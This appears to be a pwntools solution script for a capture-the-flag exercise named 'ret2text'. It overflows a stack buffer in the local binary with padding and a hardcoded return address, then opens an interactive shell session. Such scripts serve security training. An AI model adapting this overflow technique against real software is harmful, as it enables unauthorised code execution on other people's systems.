from pwn import *

sh = process('./ret2text')
target = 0X0804863a
sh.sendline('A'*(0x6c + 4) + p32(target))
sh.interactive()


